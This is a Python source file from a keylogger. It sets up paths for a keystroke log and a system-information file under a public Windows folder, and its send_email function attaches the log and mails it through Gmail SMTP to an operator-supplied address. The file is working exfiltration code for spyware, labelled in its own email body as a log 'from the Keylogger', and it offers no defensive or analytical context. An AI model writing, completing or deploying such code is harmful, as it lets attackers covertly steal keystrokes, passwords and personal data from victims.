from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import threading

keys_infor = "key_log.txt"
system_info = "system_info.txt"
file_path = "C:\\Users\\Public\\Public Keylogger" #Default path
extend = "\\"

toaddr = "" # address to send the log file to

email_address = "" # ur mail address
password = "" # ur mail password


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Log File from the Keylogger"

    msg.attach(MIMEText(body, 'plain'))

    attachment_path = os.path.join(file_path, extend, attachment)
    if not os.path.exists(attachment_path):
        print(f"File not found: {attachment_path}")
        return

    with open(attachment_path, 'rb') as attachment_file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)  
    msg.attach(p)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(fromaddr, password)
            server.sendmail(fromaddr, toaddr, msg.as_string())
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")



        